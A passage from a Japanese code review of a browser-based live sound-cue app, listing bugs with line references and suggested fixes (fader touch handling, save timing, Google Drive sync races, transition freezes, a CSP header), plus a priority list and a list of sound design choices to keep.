**指摘**: 他の経路（`renderPicker` L2004、`commit` L2300）は `sceneValuesOf(scene)`（=シーンマスターを掛けた値）を `live.currentValues` に入れますが、ここだけ**生の値をそのまま入れています**。シーンマスターを50%にしているシーンで 🎚️ から channel を100%にすると、**そのシーンだけ100%で鳴ります**（保存値は正しいので、次にそのシーンへ入り直すと50%に戻る＝再現しにくいズレ）。あわせて L1850 の `live.muted=null` は、MUTE中に音量を編集すると**MUTEの復帰情報を捨てます**（指摘1と同種）。

**修正案**:
1. 他の経路と同じにする（推奨）:
   ```js
   if(scene.id===live.currentSceneId&&!live.trans){
     live.currentValues=sceneValuesOf(scene);        // マスターを掛けた値で揃える
     if(effectiveValue(a.id)>0)ensureChannel(a.id).then(applyMix);
     applyMix();updateInterruptReadouts();
   }
   ```
   *理由*: 「同じ意味の処理は同じ書き方」に揃えるだけで、ズレが構造的に起きなくなります。
2. `live.muted=null` を削る（MUTE解除は MUTE ALL ボタンだけの責務にする）。*理由*: 復帰情報を守れます。

## 15. フェーダーが `pointercancel` を処理しないので、タッチ操作で値が飛ぶ

**該当箇所**: `VFader()` L1299–1303

**指摘**: `pointerup` でしか `dragging=false` にしていません。タッチ操作が OS 側で取り消された場合（着信、システムジェスチャ、要素の入れ替え）は `pointercancel` だけが飛び、**`dragging` が true のまま**残ります。その後で同じフェーダーの上を指がなぞると、押していないのに値が変わります。演奏中のiPadで音量が突然変わる、という形で出ます。

**修正案**:
1. 取り消し系のイベントも拾う（推奨）:
   ```js
   for(const ev of ['pointerup','pointercancel','lostpointercapture'])
     el.addEventListener(ev,()=>{if(!dragging)return;dragging=false;onChange&&onChange(value);});
   ```
   *理由*: 1行相当の追加で、タッチ環境の誤操作が消えます。

## 16. 同じSEをパッドとシーンの両方で使うと、パッドを押すとシーンのループSEも止まる

**該当箇所**: `stopSE()` L1210–1215 / `triggerSE()` L1257–1264

**指摘**: `seActive` は音源IDごとに**1つの集合**なので、パッドの2度押し（=停止）が**そのIDで鳴っている全ソース**を止めます。シーンに登録したループSE（雨音など）と同じ音源をパッドにも割り当てている場合、パッドを2回押すとシーンの雨音まで止まり、**シーンに入り直すまで戻りません**。

**修正案**:
1. パッド停止はパッド由来のソースだけ止める（推奨）:
   ```js
   function stopPadSE(id){const set=seActive.get(id);if(!set)return;
     for(const s of [...set])if(!(s.__se&&s.__se.scene)){try{s.stop();}catch(e){}set.delete(s);sePlaying.delete(s);}
     if(!set.size){seActive.delete(id);markPad(id,false);}}
   ```
   `triggerSE` の判定も「パッド由来が鳴っているか」に変える。
   *理由*: シーンの音とポン出しの独立（改修計画書#8 §1-1）を、SEの中でも徹底できます。

## 17. ライブラリの ▶ 試聴が MASTER を通らず、URLも解放していない

**該当箇所**: `togglePreview()` L2425–2432 / `<audio id="previewAudio">` L554

**指摘**: この試聴だけ `<audio>` 要素で再生しており、**Web Audio のグラフを通らない**ため MASTER（全体）・SE MASTER が効きません。マスターを下げて演奏していても、試聴だけ**フルボリュームで出ます**（配信にもそのまま乗ります）。加えて `URL.createObjectURL` を `revokeObjectURL` していないので、試聴のたびにメモリ上のURLとBlob参照が残ります。音源選択パネルの「試聴」（L1878–1897）は seBus 経由で正しく作られているので、こちらだけ取り残されています。

**修正案**:
1. 音源選択と同じ `togglePreviewAt()` を使う（推奨）。*理由*: マスターが効き、実装も1つに減ります。
2. `<audio>` を残すなら、`el.onended`/切替時に `URL.revokeObjectURL(el.src)` を必ず呼び、`state.settings.masterAll` を `el.volume` に反映する。*理由*: 最小修正ですが、二重管理が残ります。

## 18. 取り込み・書き出しの失敗が握り潰され、ユーザーに伝わらない

**該当箇所**: `importFiles()` L2406–2418 / `#fileInput` の change L2421 / `#exportBtn` L2626–2633 / `blobToB64()` L2624

**指摘**:
- `importFiles` は `await blobPut(id,f)`（L2413）に try/catch がありません。容量超過などで失敗すると**残りのファイルが黙って取り込まれず**、`markDirty()`／`renderAll()`（L2417）にも到達しないため、**先に成功した分も画面に出ません**（リロードすれば出ます）。呼び出し側（L2421）も catch していないので、コンソール以外どこにも出ません。
- `#exportBtn` は全体が try/catch なしです。音源が大きいと `JSON.stringify`（L2630）が文字列長の上限（V8で約512MB）に達して例外になり、**押しても何も起きない**＝バックアップが取れているつもりで取れていない状態になります。
- `blobToB64` は `FileReader` の `onerror` を設定していないため、読み取り失敗時に**Promiseが永久に解決されず**、書き出しが無言で止まります。

**修正案**:
1. どちらも try/catch して結果を必ず表示（推奨）: 「N件取り込みました／M件失敗しました（理由）」。`blobToB64` に `r.onerror=()=>rej(r.error)` を追加。*理由*: バックアップは「取れていない」ことに気づけるかが命です。
2. 書き出しを分割する（音源を別ファイル、またはZIPなしの複数ファイル）／`state`だけの軽量エクスポートを別ボタンで用意。*理由*: 大規模データでも確実に保存できます（依頼書 3-6 の代替案）。
3. 進捗表示（「12/48件を書き出し中」）。*理由*: 数百MBでは数十秒かかるため、固まったと誤解されにくくなります。

## 19. 保存が400ms遅延なので、直後にタブを閉じると最後の編集が消える

**該当箇所**: `markDirty()` L812–822

**指摘**: 編集は400ms後にまとめて保存されます（連続入力では最後の入力から400ms）。**その間にタブを閉じる・ブラウザが落ちる・PCがスリープすると、最後の編集は消えます**。Drive へは更に3秒後（L2780）なので、そちらはもっと長い窓が空きます。

**修正案**:
1. `pagehide` / `visibilitychange` で即時保存（推奨・短い）:
   ```js
   const flush=()=>{if(!saveTimer)return;clearTimeout(saveTimer);saveTimer=null;
     try{kvPut('state',JSON.parse(JSON.stringify(state)));}catch(e){}};
   addEventListener('pagehide',flush);
   document.addEventListener('visibilitychange',()=>{if(document.visibilityState==='hidden')flush();});
   ```
   *理由*: 「閉じる直前に保存」が入るだけで、失う可能性がほぼ無くなります（IndexedDBへの書き込みは非同期ですが、`pagehide` 時点で開始できれば大半は完了します）。
2. デバウンスを短くする（400→150ms）か、シーンの追加・削除だけは即時保存にする。*理由*: 影響が大きい操作を確実に残せます。
3. 未保存インジケータを明示（「保存中…」の間は閉じないでほしいと分かる表示）。*理由*: 人の運用でカバーできます。

## 20. Drive 同期の競合・件数上限・削除の未反映

**該当箇所**: `drive.sync()` L2744–2776 / `listFiles()` L2722–2727 / `scheduleStateUpload()` L2777–2783

**指摘**（依頼書 3-5 への回答）:
- **同時実行の防止が無い**: 「今すぐ同期」ボタンと自動アップロード（3秒後）が重なると、`listFiles()` が `drive.fileIds` を作り直している最中に `upload()` が走り、`fileIds['state.json']` が未設定の瞬間に **POST（新規作成）** されて `state.json` が2つできることがあります。以後どちらが読まれるかは Drive の返す順番次第で、更新が消えます。
- **`pageSize=1000`**（L2724）: 音源1000件を超えると一覧が切れ、既にある音源を「無い」と判断して重複アップロードします。`nextPageToken` 未対応。
- **削除が同期されない**: ローカルで音源を削除しても Drive 上のファイルは残り、別端末は `state.json` に無いファイルを黙って持ち続けます（容量を食い続けます）。
- **更新の検知が「有無」だけ**（L2767–2771）: 同じIDの音源を差し替えても、Drive 側にファイルがあればアップロードされません。

**修正案**:
1. 同期に1本のロックを掛ける（推奨・数行）:
   ```js
   syncing:false,
   async sync(){ if(drive.syncing)return; drive.syncing=true; try{ …既存処理… } finally{ drive.syncing=false; } }
   ```
   併せて `scheduleStateUpload` も `if(drive.syncing)return setTimeout(...)` で後回しにする。*理由*: 一番起きやすい「二重 state.json」を止められます。
2. `nextPageToken` に対応して全件取得。*理由*: 大規模運用での取りこぼしを無くします。
3. 削除の反映（`state.audios` に無い `audio_*` を trash に送る）は**確認ダイアログ付きで任意実行**に。*理由*: 自動削除は事故になりうるので、手動の「Driveの不要ファイルを整理」ボタンが安全です。

## 21. `alert` / `confirm` の間はアニメーションが止まり、遷移が途中で固まる

**該当箇所**: `alert`/`confirm` 全19箇所（L1775, L2117, L2181, L2185, L2188, L2194, L2382, L2412, L2559, L2640, L2651, L2652, L2655, L2687, L2701, L2917, L2918, L2938, L2939）/ `tick()` L1266–1276

**指摘**: 自動フェード中の進行は `requestAnimationFrame`（`tick`）で計算しています。`alert`/`confirm` が開いている間 rAF は止まるため、**クロスフェードが途中で凍り、両方のシーンが鳴り続けます**。詳細編集タブでも Enter キーで GO は動くので（L1812）、「遷移中に音源を削除しようとして確認ダイアログが出る」経路は現実に起こりえます。

**修正案**:
1. 遷移の進行を時計基準にする（推奨）: `tick` で `t.x` を計算するのではなく、**遷移開始時に Web Audio の自動化（`linearRampToValueAtTime`）を予約**してしまい、`tick` は表示更新だけにする。*理由*: 画面が止まっても**音は正しく進みます**。手動フェーダー時は現行方式を維持できます。
2. ダイアログを出す前に「遷移中なら完了させる」か、遷移中は削除系の操作を無効化する。*理由*: 実装は軽いですが、操作の自由度が下がります。
3. `alert`/`confirm` を画面内の非ブロッキングな通知・確認UIに置き換える。*理由*: 演奏中の割り込みが一番減りますが、変更箇所が多くなります。

## 22. 音源IDを CSS セレクタに埋め込んでいるため、不正なIDで再生処理が止まる

**該当箇所**: `markPad()` L1206–1209 / `startSE()` L1245

```js
const pad=$(`.sePad[data-id="${id}"]`);
```

**指摘**: 通常は `crypto.randomUUID()` なので安全ですが、**インポートしたファイルや Drive の `state.json` に入っていたIDはそのまま使われます**（`migrate` はIDを検証していません）。IDに `"` や `]` が含まれると `querySelector` が `SyntaxError` を投げ、`startSE` の途中で止まって**その音が鳴らない／パッドの点灯が壊れる**という形で出ます。

**修正案**:
1. セレクタを使わずに探す（推奨）:
   ```js
   const pad=[...document.querySelectorAll('#sePads .sePad')].find(b=>b.dataset.id===id);
   ```
   *理由*: 文字列を組み立てないので、どんなIDでも壊れません（9件のパッドを走査するだけなので速度も問題になりません）。
2. `migrate()` でIDを検証し、不正なら再発行して参照も張り替える。*理由*: 根本的ですが、参照の張り替え（scenes側）を丁寧にやる必要があります。
3. `CSS.escape(id)` を使う。*理由*: 短く直せますが、`CSS.escape` の存在確認が必要です。

## 23. 🎚️ダイアログが全BGM行を一気に描画する

**該当箇所**: `openSceneCfg()` L2046 / `renderChanRows()` L1832–1860

**指摘**: 絞り込み欄はありますが、**開いた瞬間は全BGM（最大200件）分のスライダーと数値入力を作ります**（1行あたり4要素＋2リスナー）。200件で800要素・400リスナーになり、ダイアログが開くまで一瞬固まります。演奏中の操作なので体感に響きます。

**修正案**:
1. 初期表示を「このシーンで使用中のチャンネル」だけにし、「全チャンネルを表示」ボタンで残りを出す（推奨）。*理由*: 使う場面の99%は「今入っている音の微調整」なので、実用性を落とさずに軽くできます。
2. ライブラリと同じページング（50件ずつ）を入れる。*理由*: 効果はありますが、探す手間が増えます。

## 24. `linkXfadeIn()` が保存要求のたびに全シーンをソートし直す

**該当箇所**: `markDirty()` L813 / `linkXfadeIn()` L792–811

**指摘**: `markDirty()` は**マスター音量スライダーのドラッグ1ピクセルごと**にも呼ばれます（L1517–1531, L2319, L2549）。そのたびに全シーンをセッション単位でグループ化して並べ替え（O(n log n)）ています。100シーンで1ドラッグ数十回なら実測影響は小さいですが、無駄な計算であることは明らかです。また**シーンと無関係な編集（音源名の変更、マスター音量）でもシーンデータを書き換える可能性がある**のは、後から読むと因果が追いづらい設計です（依頼書 3-2 の「本当に毎入力で実行する必要があるか」への答え: **不要**）。

**修正案**:
1. シーンに触る操作だけで呼ぶ（推奨）: `markDirty()` から外し、`commit()`／`commitCfgTrans()`／シーン追加・削除・並び替え・`migrate()` の直後だけで呼ぶ。*理由*: 意味が明確になり（「シーンを触ったから連動を張り直す」）、無駄も消えます。
2. `markDirty` の中の**デバウンス済みタイマー側**（400ms後）に移す。*理由*: 呼び出し箇所を変えずに回数を1/数十にできます。ただし画面表示は連動前の値を一瞬見せます。

## 25. 削除したシーンが再生中／NEXT／遷移先だったときの後片付けが足りない

**該当箇所**: `deleteScene()` L2121–2127 / `finalizeTransition()` L1002–1021 / セッション削除 L2179–2197

**指摘**:
- 再生中シーンを削除すると `live.currentSceneId=null` にしますが、**`live.currentValues` はそのまま**なので音は鳴り続けます。画面は「再生中: （無音）」と表示され、実際には音が出ている状態になります。上書きボタンも無効化され、止めるには ALL STOP か全停止が必要です。
- 削除したシーンが `live.trans.toSceneId` だった場合、`finalizeTransition()` の `to` が `undefined` になり、`currentSceneId` は**存在しないID**になります。`fireSceneSE` も呼ばれないので、**前のシーンのループSEが止まらずに残ります**（L1018）。
- セッション削除で「シーンも削除」を選んだとき（L2188–2192）も同様に `currentValues` が残ります。

**修正案**:
1. 削除時に音まで片付ける（推奨）:
   ```js
   function deleteScene(id){ const s=sceneById(id);if(!s)return;
     if(live.trans&&live.trans.toSceneId===id)cancelTransition();
     if(live.currentSceneId===id){live.currentSceneId=null;live.currentValues={};live.currentLoops={};
       for(const a of bgmAudios())if(effectiveValue(a.id)<=0)stopChannel(a.id);stopSceneSE();applyMix();}
     …
   ```
   *理由*: 「消したのに鳴っている」という一番混乱する状態を無くせます。
2. 再生中シーンの削除時に確認文を変える（「このシーンは再生中です。音を止めて削除しますか？」）。*理由*: 意図しない削除も防げます。

## 26. README・画面表示と実装の食い違い（3件）

**該当箇所**: README L44（MUTE ALL）/ `sound.html` L507（Drive同期の説明）/ README L49（先読み）

**指摘**（依頼書 観点13への回答）:

| 記載 | 実装 | 影響 |
| --- | --- | --- |
| README L44「MUTE ALL は…もう一度押すと元の音に戻ります」＋ ツールチップ L1455「同じ状態に戻ります」 | SEは戻らない（指摘2） | 演奏中に「戻るはず」と思って押すと環境音が消える |
| L507「起動時・接続時に同期します」 | **起動時の同期は無い**。トークンを保存していないため、リロード後は未接続（`drive.connected=false`）で、ユーザーが「接続して同期」を押すまで何も起きない | 「開けば同期されている」と思い込むと、別端末の変更を取り込まないまま上書きしうる（指摘5と連動） |
| README L49「操作した瞬間（待ち時間0）に音が鳴ります（必要な音源は起動時に先読みデコード）」 | 先読みは**最初のクリック後**に開始し、対象はSE＋フェーダー割当BGMのみ。シーンBGMは対象外（指摘12） | シーン遷移の初回だけ待たされ、原因が分からない |

**修正案**:
1. 実装を直してから README を直す（推奨、指摘2・12・4の順）。*理由*: ドキュメントだけ直すと、機能は不便なままになります。
2. すぐに直せない項目は README に「既知の制約」として明記する。*理由*: 期待とのズレによる事故は防げます。

---

# 🔵 提案（10件）

> この節の指摘はすべて **重大度 🔵**（今すぐ直す必要はないが、直すと読みやすさ・将来の安全性が上がる）です。

## 27. `Array.find` による O(n) 検索が描画ループの中で使われている

**該当箇所**: `audioById`/`sceneById` L823–824 / `selectedRows()` L1863–1869 / `scenesOf()` L829–832 / `renderSceneList()` L1413

**指摘**: `selectedRows()` は1行ごとに `audioById()`（全音源を線形検索）を呼びます。シーンカードごとに呼ばれるので、**シーン50件×登録10件×音源200件 = 10万回**の比較になります（実測で数十ミリ秒程度、致命的ではありません）。`scenesOf()` は呼ぶたびに全シーンの Map を作り直し、`sceneCardEl` から1カードごとに呼ばれるため O(n²) です。`renderSceneList` の `scenes.indexOf(s)`（L1413）も同様です。

**修正案**: 描画の開始時に一度だけ索引を作って使い回す。
```js
let audioIndex=new Map();
function reindex(){audioIndex=new Map(state.audios.map(a=>[a.id,a]));}
const audioById=id=>audioIndex.get(id)||state.audios.find(a=>a.id===id);  // 保険付き
/* state.audios を変更する箇所（import/削除/移動/インポート）で reindex() */
```
*理由*: 将来200件→1000件に増えたときに効きます。今の規模では体感差は小さいので優先度は低めです。

## 28. `requestAnimationFrame` が常時回っている

**該当箇所**: `tick()` L1266–1276

**指摘**: 遷移中でなければ `if(t&&t.mode==='auto')` の判定1回で終わるため、実測の負荷はごくわずかです（毎秒60回の比較）。ただしタブが表示されている間は常にフレームを要求するので、ノートPCでは省電力状態に入りにくくなります。

**修正案**: 遷移開始時だけループを開始し、`finalizeTransition`/`cancelTransition` で止める。
```js
let rafId=null;
function startTick(){if(rafId==null)rafId=requestAnimationFrame(tick);}
function tick(){ … if(!live.trans||live.trans.mode!=='auto'){rafId=null;return;} rafId=requestAnimationFrame(tick); }
```
*理由*: 効果は小さいので後回しで構いません。**ただし指摘21の対策1（自動化予約）を入れる場合は、この整理も同時にやると綺麗です。**

## 29. `state.settings.master` という名前が「BGMマスター」を指していて紛らわしい

**該当箇所**: L715 / L864–866 / L1522–1526

**指摘**: `masterAll` = 全体、`master` = BGMのみ、`seVol` = SE。`master` だけ対象が名前から読めず、`engine.master`（全体のGainNode）と名前が衝突しています。依頼書 観点11（なぜ動くか分からない箇所）に該当する読みづらさです。

**修正案**: 保存キーは互換のため残し、**読み書き用のアクセサだけ意味のある名前にする**。
```js
const vol={ get all(){return state.settings.masterAll;}, get bgm(){return state.settings.master;}, get se(){return state.settings.seVol;} };
```
*理由*: データ互換を壊さずに読みやすくできます。移行を伴う改名（`master`→`bgmMaster`）は `migrate()` に1行足せば可能ですが、旧バージョンとの相互運用が切れます。

## 30. 小さな整理（動作に影響しないもの）

- **重複行**: `renderSceneActions()` の `sb.classList.toggle('danger',!live.allStopped)` が L1465 と L1474 に2回あります（片方は不要）。
- **未使用**: `lerp`（L617）はどこからも呼ばれていません。`idb()` の戻り値（L700–703）は `kvPut`/`blobPut` では使われず、常に `undefined` を解決します（意図どおりですが読み手が迷います）。
- **効かない引数**: `ui.xfader.set` の差し替え（L1513–1514）で第2引数 `silent` を捨てているため、`VFader.set(v,silent)` の `silent` は全経路で無意味です。`tick` からは毎フレーム `silent=true` で呼ばれています（L1271）。
- **隠しボタン**: 登録済みカードの「一時保存」ボタンは `display:none` で残っています（L2380）。DOMから作らない方が読みやすく、タブ移動の邪魔にもなりません。
- **コメントの版ずれ**: L711 のコメントが `State (version 3)`、L728 が `v1/v2 -> v3` のままです（現在は v5）。

*理由*: いずれも1行で直せます。将来の読み手（と自分）の混乱を減らします。

## 31. 「カットOUT＋INフェード」と「カットOUT＋INクロス」は音が同じ

**該当箇所**: `transGains()` L648–657 / `isSeq()` L645

**指摘**: `fade` と `xfade` の違いは「OUTとINが順番か同時か」だけなので、**OUTがカットのときは両者が完全に同じ挙動**になります（`isSeq` は OUT が fade のときだけ true）。UI上は別の選択肢に見えるため、「選び直したのに変わらない」と受け取られます。

**修正案**: OUT が「カット」のときは IN の選択肢から「フェード」か「クロスフェード」の一方を隠す、または注記（「カットOUTのときフェードとクロスは同じ動きです」）を出す。*理由*: 実装は変えずに誤解だけ消せます。

## 32. CSP を入れる余地

**該当箇所**: `<head>` L3–6 / GISの読み込み L2680–2684

**指摘**: CSPが無いため、万一のスクリプト混入（指摘9）で任意の外部通信ができます。

**修正案**:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-inline' https://accounts.google.com; connect-src 'self' https://www.googleapis.com https://oauth2.googleapis.com blob: data:; img-src 'self' data: blob:; media-src 'self' blob: data:; style-src 'self' 'unsafe-inline'">
```
*注意*: 単一HTMLでインラインスクリプトを使う構成なので `'unsafe-inline'` は外せません（＝XSS対策としては限定的）。**それでも「知らないドメインへ送信できない」効果は残る**ので、指摘9の対策1と併用する前提で入れる価値があります。GitHub Pages ではHTTPヘッダを設定できないため meta タグで入れる形になります。

## 33. Drive のログをコピーできない

**該当箇所**: `body{user-select:none}` L19 / `#log` L279

**指摘**: 全体で選択を禁止しているため、`#log` のエラーメッセージを選んでコピーできません。不具合報告時に困ります。

**修正案**: `#log{user-select:text;-webkit-user-select:text}` を足す。*理由*: 1行で報告のやりとりが楽になります。

## 34. Firefox では横スライダーのつまみが小さいまま

**該当箇所**: L74–75, L203（`::-webkit-slider-thumb` のみ指定）

**指摘**: マスターバーのつまみ拡大（23〜25px）は WebKit/Blink 専用の擬似要素で指定しているため、**Firefox では既定の小さいつまみ**になります。動作はしますが「一回り大きく」の意図が Firefox では効きません。

**修正案**: `::-moz-range-thumb` と `::-moz-range-track` を併記する。
```css
.mb .hslider::-moz-range-thumb{width:23px;height:23px;border:none;border-radius:50%;background:var(--blue)}
```
*理由*: 3行で見た目が揃います。

## 35. IndexedDB のバージョン運用（将来のため）

**該当箇所**: `DB_VER=1` L692 / `openDB()` L694–699

**指摘**: `onupgradeneeded` は「無ければ作る」形なので、**将来ストア構成を変える際にバージョンを上げれば安全に移行できます**（現状の作りで詰まりません）。ただし `onblocked`（他タブが古いバージョンで開いている場合）を扱っていないため、複数タブで開いていると新バージョンへの移行が無言で止まります。

**修正案**: `rq.onblocked=()=>alert('他のタブでこのアプリが開いています。閉じてから再読み込みしてください。')` を追加。*理由*: 将来の移行時に原因不明の停止を避けられます（今すぐの必要はありません）。

## 36. 「なぜ動いているのか分かりにくい」箇所（観点11）

読み解きに時間がかかった箇所です。**動作は正しい**ので、コメントの追加だけを提案します。

1. `ui.xfader.set` の差し替え（L1513–1514）: `const _xfSet=ui.xfader.set;` で元の関数を退避してから同名で上書きしています。再帰にならない理由（退避が先）を1行コメントで。
2. `transGains()` の `kk`（L650）: `clamp(k,0.02,0.98)` が「0除算とゼロ幅区間を防ぐため」であることを明記。
3. `doGO()` のカット専用処理（L1047–1053）: `beginTransition` → `x=1` → `setValueAtTime` → `finalize` の順で、**なぜ tick を待たずに確定できるのか**（ランプを使わないため）を明記。
4. `migrate()` が `Object.assign(blankState(),raw)` で**入力オブジェクトを参照ごと取り込み、以降その中身を破壊的に書き換えている**こと（L730）。呼び出し側が `raw` を再利用しない前提であることを明記。
5. `startChannel()` の `src.onended` が `engine.channels.get(id)===ch` を確認している理由（同じIDで作り直された後の古いコールバックを無視するため、L892）。

---

# 今すぐ直すべき物リスト

| # | 内容 | 直すと何が良くなるか |
| --- | --- | --- |
| 1 | **指摘1**: シーン停止中の ALL STOP／全停止でスナップショットを引き継ぐ（または停止系を1つのスタックに統合） | 「再生中なのに無音・復帰不能」が消える。過去に繰り返している同種バグの再発も止まる |
| 2 | **指摘3**: インポートを「検証 → 書き込み → 最後に削除」の順に変える | 壊れたファイルを読んでも**音源が消えなくなる**（最悪でも「取り込めませんでした」で済む） |
| 3 | **指摘4**: Drive のアップロード失敗・401を必ず表に出す（バッジに「未同期」を追加） | 「同期できていたつもり」が無くなる。1時間でトークンが切れる前提のセッションで必須 |
| 4 | **指摘6**: prewarm の対象から長尺BGMを外す（＋指摘12のNEXT先読み） | 実運用のBGM構成でタブが落ちなくなり、初回GOの待ちも消える |
| 5 | **指摘2**: MUTE ALL を「マスター音量を0にする」方式に変える | 解除でSE（環境音）が確実に戻る。説明と挙動が一致する |
| 6 | **指摘8**: 手動フェーダーの `await` 明けに状態を再確認（3行） | 遷移が中途半端に固まらなくなる |
| 7 | **指摘7**: 起動失敗時にエラーを画面に出す | 「真っ白で無反応」が「原因と対処が読める画面」になる |
| 8 | **指摘9**: `#tagList` を `innerHTML` から DOM 生成に変える（1箇所） | 外部ファイル経由のスクリプト実行と Drive トークン漏えいを塞げる |
| 9 | **指摘19**: `pagehide`/`visibilitychange` で即時保存 | 閉じる直前の編集が失われなくなる |
| 10 | **指摘5**: Drive で上書きする前に負ける側を退避 | 別端末の変更が消えても**戻せる**ようになる |

---

# 触らなくてよい／今のままが正しい箇所

意図的な設計だと判断した箇所です。**壊さないよう、改修時はここを避けてください。**

1. **単一HTML・ビルド無し・依存ライブラリ無し**（全体）。配布と可搬性を優先した明確な設計判断で、レビュー範囲外としました。
2. **音量を内部0〜1000（パーミル）で持ち、表示だけ%に変換**（L619–622）。丸め誤差を避ける良い設計です。`fmtPct`/`pctToVal` の統一も一貫しています。
3. **`effectiveValue = max(シーン値, 割込値)`**（L967）。割込フェーダーがシーンの保存値を書き換えない、というアプリの根幹ルールで、複数の受け入れ基準で守られています。
4. **`ensureChannelNow()`（同期起動）と `ensureChannel()`（非同期）の二段構え**（L902–919）。「押した瞬間に鳴る」ための工夫で、先読み済みバッファがある限り待ちません。消さないでください。
5. **`sceneSESrcs` によるシーンSEとパッドSEの区別**（L1205, L1216–1224）。改修計画書#8の「ポン出しの独立」を成立させている中心部分です。
6. **`linkXfadeIn()` がデータを上書きする仕様**（L789–811）。Session 7 でユーザーが明示的に選択した仕様なので、**挙動は変えず呼び出し回数だけ**の改善提案にとどめました（指摘24）。
7. **`migrate()` の徹底した防御的初期化**（L729–787）。型違い・欠損・`null`・配列でない値を全て受け止めており、v1〜v5で冪等です（検証結果は下記 3-4 参照）。ここは非常に良く書けています。
8. **ライブラリの50件ページング**（L2438, L2499–2501）。200件規模でDOMが爆発しないようにする既存の対策で、有効に機能しています。
9. **`JSON.parse(JSON.stringify(state))` によるスナップショット**（L818 など）。`state` には音源の実体（Blob）が入らずメタデータだけなので、200件でも数百KB規模です。**現状は問題ありません**（依頼書 3-4 の懸念に対する回答）。
10. **`transGains()` の数式**（L648–657）。OUT/INの9通りを1つの式で表現できており、境界値も破綻しません（検証結果は下記 3-2 参照）。式を単純化しようとして壊す価値はありません。
11. **`touch-action:none` と `setPointerCapture` によるフェーダー実装**（L142, L1300）。タブレットでの操作品質のために必要です（`pointercancel` の追加だけ推奨＝指摘15）。
12. **`.ssopack.json` のBase64同梱**（L2624–2633）。「1ファイルで持ち運べる」ことを優先した判断として妥当です。大規模時の代替案（指摘18）は**追加**の位置づけで、既存形式は維持してください。

---

# 依頼書「3. レビュー観点（このアプリ特化）」への個別回答

## 3-1. Web Audio まわり

| 観点 | 結果 | 根拠 |
| --- | --- | --- |
| `AudioContext` の生成・`resume()` タイミング | 🟡 **概ね正しいが、中断（interrupted）からの自動復帰が無い** | 初回 `pointerdown` で `ensureCtx()`（L2958）、各操作でも `ensureCtx()` を呼び、`suspended` なら `resume()`（L868）。ジェスチャ内生成なので iOS Safari / Chrome の自動再生ポリシーは通ります。ただし iOS の**着信・他アプリによる中断**（`state==='interrupted'`）を監視する `statechange` ハンドラが無く、自動復帰しません（次の操作で `ensureCtx()` が呼ばれれば復帰します）。→ 追加推奨: `engine.ctx.onstatechange=()=>{if(engine.ctx.state!=='running')engine.ctx.resume();}` |
| ノードのリーク | 🟡 **1経路のみリーク** | SE（L1238–1242）は `onended` で `disconnect()`、`stopChannel`（L932）も `disconnect()` 済み、試聴（L1889）も `disconnect()` 済み。**非ループBGMの自然終了だけ** `disconnect()` も Map 削除もしていません（L892）→ 指摘10。3〜6時間セッションで「非ループBGMを何度も鳴らす」使い方をすると溜まります |
| ノイズ（プチッ） | 🟡 **5経路で出る** | `stopChannel` の即停止（L932）、割込■停止（L1663）、MUTE ALL（L1197）、全停止（L1123）、カットIN の `setValueAtTime`（L1052）→ 指摘11。`applyMix` の `setTargetAtTime`（L883）と `startChannel` の0スタート（L886）は問題なし |
| `engine.buffers` のメモリと破棄戦略 | 🔴 **破棄戦略が必要** | 上限も破棄も無く（L856, L879）、`prewarmBuffers` が全件デコード（L926）。デコード後PCMは1分あたり約21MB（ステレオ44.1kHz）。5分BGM×12本で約1.2GB → 指摘6 |
| `prewarmBuffers()` の逐次デコードによるブロック | 🟡 **UIはブロックしないが、初回操作は遅れうる** | `for` の中で1件ずつ `await`（L927）。`decodeAudioData` は別スレッドなのでUIは固まりませんが、**200件を順番に**デコードするため後ろの音源は数十秒待ちになります。その間に押されたパッドは非同期経路（L1263）に落ちるので鳴りはしますが、「待ち時間0」ではありません。→ 指摘6の修正案1（対象を絞る）で自然に解決します |

## 3-2. シーン遷移ロジック

| 観点 | 結果 | 根拠 |
| --- | --- | --- |
| OUT×IN 9通り | 🔵 **数式は正しい。ただし実際に鳴るのは6通り**（仕様どおり） | `transGains`（L648–657）を境界値で検算しました。**x=0**: OUTカットのみ `o=1`、他は `o=1`／`i=0`（カットINは `i=0`）。**x=1**: `o=0`、`i=1`（カットINも `i=1`）。**xfade×xfade**: `o=1-x, i=x`（同時）。**fade×fade**: `isSeq` で OUT が `kk` まで、IN が `kk` 以降（順次、合計 oT+iT）。**fade×cut**: OUTは全区間で下降、INは x=1 で出現。**cut×任意**: `o=0`（x>0）。`kk=clamp(ratio,0.02,0.98)`（L650）でゼロ除算と幅0を防止済み。フェード0.1秒でも `dur=100ms`（≒6フレーム）で破綻しません。**「OUTクロスなら INもクロスに強制」**（L670, Session 7の確定仕様）により、OUTクロス×INフェード／INカットは発生しません（=9通り中3つが1つに収束）。また **OUTカットのときは fade と xfade が同一挙動**になります（指摘31） |
| `beginTransition`→`finalize`/`cancel` の競合 | 🟡 **GO連打・全停止・MUTEは安全。シーン削除だけ穴がある** | GO中のGOは「即完了」に集約（L1040–1042）。`beginTransition` は `muted/scenePaused/allStopped/allOff` を明示的にクリア（L998）。`allStop`/`panicStop`/`toggleMuteAll` は先に `live.trans=null` にしてから停止処理へ入るので不整合になりません。**例外**: 遷移先シーンを削除すると `finalizeTransition` の `to` が `undefined` になり、存在しないIDが `currentSceneId` に入り、前シーンのループSEが残ります（L1004–1018）→ 指摘25 |
| 手動フェーダー `onInput` の await 競合 | 🔴 **競合あり** | 指摘8（await明けに `live.trans` の生存確認が無い）。中途半端な状態で固まる／`TypeError` が黙って捨てられる |
| `linkXfadeIn()` のコストと必要性 | 🟡 **毎入力で実行する必要は無い** | `markDirty()` の先頭で無条件実行（L813）。マスター音量ドラッグ1ピクセルごとに全シーンをソート。O(n log n)×呼び出し回数。シーン編集系の操作だけで十分です → 指摘24 |

## 3-3. 停止系ボタン4種の状態機械

**4つを任意順で押した場合の検証結果**（すべて実コードを追って確認）:

| 順序 | 結果 |
| --- | --- |
| シーン停止 → ALL STOP → ALL START | 🔴 **破綻**（音量が消えて復帰不能）→ 指摘1 |
| シーン停止 → 全停止 → 全復帰 | 🔴 **破綻**（同上。`scenePaused` を保存していない）→ 指摘1 |
| ALL STOP → 全停止 → 全復帰 → ALL START | ✅ **正常**。`panicStop` が `live.allStopped` を入れ子で保存し（L1112）、`panicStart` が復元（L1135）。その後 ALL START でシーンが戻ります（自己テスト 9-5a〜9-5e で実測済み） |
